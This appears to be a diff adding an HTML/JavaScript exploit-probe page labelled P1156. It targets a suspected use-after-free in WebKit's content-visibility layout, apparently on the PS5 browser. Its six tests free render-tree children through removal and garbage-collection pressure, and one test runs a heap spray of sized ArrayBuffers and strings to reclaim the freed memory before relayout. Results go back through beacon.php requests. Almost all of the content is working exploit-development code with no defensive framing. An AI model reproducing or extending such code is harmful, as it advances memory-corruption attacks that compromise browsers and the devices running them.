@@ -1,0 +1,369 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1156</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}
+.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}
+.win{color:#0f0;font-weight:bold;font-size:14px}
+</style>
+</head><body>
+<div id="log"></div>
+<div id="arena" style="position:absolute;left:-9999px;top:0;width:500px;height:500px;overflow:hidden"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+log('phase','=== P1156: CONTENT-VISIBILITY UAF TEST ===');
+log('info','content-visibility added in Safari 17.0 (PS5 version)');
+log('info','Bug: toggle hidden→auto after child removal → stale layer tree access');
+B('P1156-START','t='+Date.now());
+
+var arena=document.getElementById('arena');
+var startT=Date.now();
+var testsDone=0;
+var totalTests=6;
+
+function reportDone(){
+  testsDone++;
+  if(testsDone>=totalTests){
+    B('P1156-DONE','complete|dt='+(Date.now()-startT));
+  }
+}
+
+// === Feature detection ===
+(function(){
+  var el=document.createElement('div');
+  el.style.contentVisibility='hidden';
+  var hasCV=(el.style.contentVisibility==='hidden');
+  B('P1156-FEATURE','contentVisibility='+hasCV);
+  log('info','content-visibility supported: '+hasCV);
+  if(!hasCV){
+    B('P1156-DONE','no content-visibility support');
+    return;
+  }
+})();
+
+// === TEST A: Basic content-visibility toggle after child removal ===
+(function(){
+  log('phase','--- A: Basic toggle after removal ---');
+  var container=document.createElement('div');
+  container.style.contentVisibility='hidden';
+  container.style.width='200px';
+  container.style.height='200px';
+  container.style.background='#333';
+  arena.appendChild(container);
+
+  // Create many child elements with complex rendering
+  var children=[];
+  for(var i=0;i<50;i++){
+    var child=document.createElement('div');
+    child.style.width='180px';
+    child.style.height='30px';
+    child.style.background='linear-gradient(to right, red, blue)';
+    child.style.margin='2px';
+    child.style.borderRadius='5px';
+    child.style.boxShadow='2px 2px 5px rgba(0,0,0,0.5)';
+    child.textContent='Child '+i;
+    container.appendChild(child);
+    children.push(child);
+  }
+  document.body.offsetHeight; // force layout
+
+  // Remove ALL children while hidden
+  for(var i=0;i<children.length;i++){
+    container.removeChild(children[i]);
+  }
+  children=null; // drop references
+
+  // GC pressure to free child data
+  for(var g=0;g<2000;g++){var t={a:new Array(50)};t=null;}
+  for(var g=0;g<1000;g++){var t2=new ArrayBuffer(1024);t2=null;}
+
+  // NOW toggle to auto — triggers layer tree recomputation on freed children
+  try{
+    container.style.contentVisibility='auto';
+    document.body.offsetHeight; // force layout
+    B('P1156-A','toggle=ok|no crash');
+  }catch(e){
+    B('P1156-A','toggle=err|msg='+e.message.substring(0,40));
+  }
+
+  // Toggle back and forth rapidly
+  for(var r=0;r<10;r++){
+    container.style.contentVisibility='hidden';
+    document.body.offsetHeight;
+    container.style.contentVisibility='auto';
+    document.body.offsetHeight;
+  }
+  B('P1156-A-RAPID','10 rapid toggles done');
+  container.remove();
+  reportDone();
+})();
+
+// === TEST B: MutationObserver + content-visibility + removal ===
+(function(){
+  log('phase','--- B: MutationObserver re-trigger ---');
+  var container=document.createElement('div');
+  container.style.contentVisibility='hidden';
+  container.style.width='200px';
+  container.style.height='200px';
+  arena.appendChild(container);
+
+  var mutCount=0;
+  var obs=new MutationObserver(function(muts){
+    mutCount+=muts.length;
+    // During mutation callback, toggle content-visibility
+    // This can cause re-entrant layer updates
+    if(mutCount<=5){
+      container.style.contentVisibility=(mutCount%2===0)?'hidden':'auto';
+    }
+  });
+  obs.observe(container,{childList:true,subtree:true,attributes:true});
+
+  // Add children
+  for(var i=0;i<20;i++){
+    var child=document.createElement('div');
+    child.textContent='mut-child-'+i;
+    child.style.width='50px';
+    child.style.height='20px';
+    child.style.contain='strict';
+    container.appendChild(child);
+  }
+
+  // Remove in a microtask (while mutations are pending)
+  Promise.resolve().then(function(){
+    while(container.firstChild)container.removeChild(container.firstChild);
+    container.style.contentVisibility='auto';
+    document.body.offsetHeight;
+    B('P1156-B','mutCount='+mutCount);
+    obs.disconnect();
+    container.remove();
+    reportDone();
+  });
+})();
+
+// === TEST C: content-visibility with CSS containment ===
+(function(){
+  log('phase','--- C: content-visibility + contain: strict ---');
+  var container=document.createElement('div');
+  container.style.contentVisibility='hidden';
+  container.style.contain='strict';
+  container.style.width='200px';
+  container.style.height='200px';
+  arena.appendChild(container);
+
+  // Add complex nested content
+  var inner=document.createElement('div');
+  inner.style.contain='layout paint';
+  container.appendChild(inner);
+  for(var i=0;i<30;i++){
+    var el=document.createElement('span');
+    el.style.display='inline-block';
+    el.style.width='40px';
+    el.style.height='15px';
+    el.style.background='hsl('+((i*12)%360)+',70%,50%)';
+    el.style.transform='rotate('+(i*3)+'deg)';
+    inner.appendChild(el);
+  }
+  document.body.offsetHeight;
+
+  // Remove inner while hidden+contained
+  inner.remove();
+  inner=null;
+  for(var g=0;g<2000;g++){var t={};t=null;}
+
+  // Toggle both containment and visibility
+  container.style.contentVisibility='auto';
+  container.style.contain='none';
+  document.body.offsetHeight;
+  B('P1156-C','toggle=ok');
+  container.remove();
+  reportDone();
+})();
+
+// === TEST D: content-visibility + IntersectionObserver ===
+(function(){
+  log('phase','--- D: IntersectionObserver during toggle ---');
+  var hasIO=(typeof IntersectionObserver!=='undefined');
+  B('P1156-D-HAS','IntersectionObserver='+hasIO);
+
+  var container=document.createElement('div');
+  container.style.contentVisibility='auto'; // auto uses IO internally
+  container.style.width='200px';
+  container.style.height='200px';
+  arena.appendChild(container);
+
+  var child=document.createElement('div');
+  child.style.width='100px';
+  child.style.height='100px';
+  child.style.background='red';
+  container.appendChild(child);
+  document.body.offsetHeight;
+
+  if(hasIO){
+    var ioFired=false;
+    var io=new IntersectionObserver(function(entries){
+      ioFired=true;
+      for(var i=0;i<entries.length;i++){
+        B('P1156-D-IO','target='+entries[i].target.tagName+'|isIntersecting='+entries[i].isIntersecting+'|ratio='+entries[i].intersectionRatio);
+      }
+    },{threshold:[0,0.5,1]});
+    io.observe(child);
+
+    // Remove child, toggle visibility
+    setTimeout(function(){
+      child.remove();
+      child=null;
+      for(var g=0;g<1000;g++){var t={};t=null;}
+      container.style.contentVisibility='hidden';
+      document.body.offsetHeight;
+      container.style.contentVisibility='auto';
+      document.body.offsetHeight;
+      B('P1156-D','ioFired='+ioFired);
+      io.disconnect();
+      container.remove();
+      reportDone();
+    },100);
+  }else{
+    container.remove();
+    reportDone();
+  }
+})();
+
+// === TEST E: Spray after content-visibility UAF trigger ===
+(function(){
+  log('phase','--- E: Heap spray after CV trigger ---');
+  var container=document.createElement('div');
+  container.style.contentVisibility='hidden';
+  container.style.width='300px';
+  container.style.height='500px';
+  arena.appendChild(container);
+
+  // Create many complex children (each ~256B of render data)
+  var children=[];
+  for(var i=0;i<100;i++){
+    var c=document.createElement('div');
+    c.style.cssText='width:280px;height:25px;background:linear-gradient(45deg,red,blue,green);border:2px solid #fff;margin:1px;box-shadow:0 0 3px rgba(0,0,0,0.3);transform:translateZ(0);will-change:transform;';
+    c.textContent='Heavy render node '+i;
+    container.appendChild(c);
+    children.push(c);
+  }
+  document.body.offsetHeight; // force full layout pass
+
+  // Record WeakRefs to children
+  var weakChildren=[];
+  for(var i=0;i<children.length;i++){
+    weakChildren.push(new WeakRef(children[i]));
+  }
+
+  // Remove ALL children while hidden
+  for(var i=0;i<children.length;i++){
+    container.removeChild(children[i]);
+  }
+  children=null;
+
+  // Heavy GC
+  for(var g=0;g<5000;g++){var t=new ArrayBuffer(512);t=null;}
+  for(var g=0;g<10000;g++){var t2={x:g};t2=null;}
+
+  // Check how many children were collected
+  var alive=0,collected=0;
+  for(var i=0;i<weakChildren.length;i++){
+    var d=weakChildren[i].deref();
+    if(d)alive++;else collected++;
+  }
+  B('P1156-E-GC','alive='+alive+'|collected='+collected);
+
+  // Spray to reclaim freed render tree data
+  var spray=[];
+  for(var k=0;k<2000;k++){
+    // Target various size classes
+    spray.push(new ArrayBuffer(64));
+    spray.push(new ArrayBuffer(128));
+    spray.push(new ArrayBuffer(256));
+    spray.push('D'.repeat(120)); // StringImpl ~132B
+    spray.push('E'.repeat(240)); // StringImpl ~252B
+  }
+  B('P1156-E-SPRAY','count='+spray.length);
+
+  // NOW trigger layer tree recomputation
+  try{
+    container.style.contentVisibility='auto';
+    document.body.offsetHeight;
+    // Add new children to trigger re-layout
+    for(var i=0;i<10;i++){
+      var nc=document.createElement('div');
+      nc.style.width='280px';
+      nc.style.height='25px';
+      nc.textContent='New child '+i;
+      container.appendChild(nc);
+    }
+    document.body.offsetHeight;
+    B('P1156-E-TOGGLE','ok|no crash');
+  }catch(e){
+    B('P1156-E-TOGGLE','err='+e.message.substring(0,40));
+  }
+
+  // Read container dimensions to see if layout is corrupted
+  var rect=container.getBoundingClientRect();
+  B('P1156-E-RECT','w='+rect.width+'|h='+rect.height+'|t='+rect.top+'|l='+rect.left);
+
+  container.remove();
+  reportDone();
+})();
+
+// === TEST F: ResizeObserver + content-visibility ===
+(function(){
+  log('phase','--- F: ResizeObserver during CV toggle ---');
+  var hasRO=(typeof ResizeObserver!=='undefined');
+  B('P1156-F-HAS','ResizeObserver='+hasRO);
+
+  if(!hasRO){reportDone();return;}
+
+  var container=document.createElement('div');
+  container.style.contentVisibility='auto';
+  container.style.width='200px';
+  container.style.height='200px';
+  arena.appendChild(container);
+
+  var child=document.createElement('div');
+  child.style.width='100%';
+  child.style.height='100px';
+  container.appendChild(child);
+
+  var roCount=0;
+  var ro=new ResizeObserver(function(entries){
+    roCount++;
+    if(roCount<=3){
+      // During resize callback, remove the observed element
+      try{
+        if(child.parentNode)child.remove();
+        container.style.contentVisibility='hidden';
+        document.body.offsetHeight;
+        container.style.contentVisibility='auto';
+      }catch(e){}
+    }
+  });
+  ro.observe(child);
+
+  // Trigger resize
+  setTimeout(function(){
+    child.style.height='200px';
+    document.body.offsetHeight;
+
+    setTimeout(function(){
+      B('P1156-F','roCount='+roCount);
+      ro.disconnect();
+      container.remove();
+      reportDone();
+    },500);
+  },100);
+})();
+
+// Timeout safety
+setTimeout(function(){
+  B('P1156-TIMEOUT','dt='+(Date.now()-startT));
+},8000);
+</script></body></html>
